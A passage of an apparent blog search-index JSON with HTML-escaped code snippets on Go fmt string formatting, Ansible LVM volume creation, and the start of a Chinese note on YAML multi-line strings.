style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eres2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;There are %[2]d oranges %d apples %[1]d plums\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en1\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en2\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en3\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eres2\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// There are 3 oranges 4 apples 2 plums\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"go-string-format-precision\"\u003eGo string format precision\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%0.f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16.540\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 17\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%0.2f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16.540\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 16.54\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%0.3f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16.540\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 16.540\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%0.5f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16.540\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 16.54000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"go-string-format-flags\"\u003eGo string format flags\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%+d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// +1691\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#x\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0x69b\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#X\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0X69B\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%#b\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0b11010011011\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%10d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e)  \u003cspan style=\"color:#75715e\"\u003e//       1691\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%-10d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 1691\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%010d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1691\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0000001691\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"go-string-format-width\"\u003eGo string format width\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;falcon\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e122\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e455.67\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%s\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e)   \u003cspan style=\"color:#75715e\"\u003e// falcon\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%10s\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ew\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e//     falcon\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e).  \u003cspan style=\"color:#75715e\"\u003e// 122\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%7d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e)  \u003cspan style=\"color:#75715e\"\u003e//     122\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%07d\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 0000122\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%10f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 455.670000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%11f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e//  455.670000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%12f\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eh\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e//   455.670000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go"],"title":"Go string format"},{"categories":["URL","Ansible","LVM"],"contents":" LVM - lvg and lvol volume group - name: 在 /dev/sda1 跟 /dev/sdb1 之上建立 volume group，其 extend size 設置為 32MB community.general.lvg: vg: vg.services pvs: /dev/sda1,/dev/sdb1 pesize: 32 local volume - name: 建立一個大小為 512m 的 local volume community.general.lvol: vg: firefly lv: test size: 512 Example --- - name: Create LVM for DRBD hosts: all become: yes vars: vg_name: drbdpool tasks: - name: Create a new primary partition for LVM community.general.parted: device: /dev/sdb number: 1 align: optimal flags: [lvm] state: present - name: Create a volume group on top of /dev/sda1 with physical extent size = 32MB community.general.lvg: vg: \u0026#34;{{ vg_name }}\u0026#34; pvs: /dev/sdb1 state: present - name: Create a logical volume community.general.lvol: vg: \u0026#34;{{ vg_name }}\u0026#34; lv: drbddata size: 100%FREE ","date":"September 5, 2022","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220905-system-lvm/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/system/lvm/\" target=\"_blank\" rel=\"noopener\"\u003eLVM - lvg and lvol\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"volume-group\"\u003evolume group\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e在 /dev/sda1 跟 /dev/sdb1 之上建立 volume group，其 extend size 設置為 32MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ecommunity.general.lvg\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evg\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003evg.services\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003epvs\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e/dev/sda1,/dev/sdb1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003epesize\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"local-volume\"\u003elocal volume\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e建立一個大小為 512m 的 local volume\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ecommunity.general.lvol\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evg\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003efirefly\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elv\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003etest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003esize\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"example\"\u003eExample\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCreate LVM for DRBD\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ehosts\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ebecome\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003eyes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003evars\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evg_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003edrbdpool\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etasks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCreate a new primary partition for LVM\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecommunity.general.parted\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edevice\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e/dev/sdb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003enumber\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ealign\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eoptimal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eflags\u003c/span\u003e: [\u003cspan style=\"color:#ae81ff\"\u003elvm]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003estate\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003epresent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCreate a volume group on top of /dev/sda1 with physical extent size = 32MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecommunity.general.lvg\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003evg\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ vg_name }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003epvs\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e/dev/sdb1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003estate\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003epresent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eCreate a logical volume\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecommunity.general.lvol\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003evg\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ vg_name }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elv\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003edrbddata\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003esize\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e%FREE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Ansible","LVM"],"title":"LVM - lvg and lvol"},{"categories":["URL","Ansible","YAML"],"contents":" YAML 裡的字串很長該怎麼做？ 在 YAML 裡已經有規範此部份，在這種情況有四種方法可以幫助我們：\n|: 其下內容的換行，就是換行，最後一行會有換行。 \u0026gt;: 其下內容的換行，不會是換行，會變為一個很長的字串，最後會有換行。 |-: 其下內容的換行，就是換行，但最後一行不會有換行。 \u0026gt;-: 其下內容的換常，不會是換行，最後一行也不會有換行。 簡單的說，\u0026gt; 跟 \u0026gt;- 可以增加 YAML 的可讀性，又不會有多餘的換行符號。而 | 跟 |- 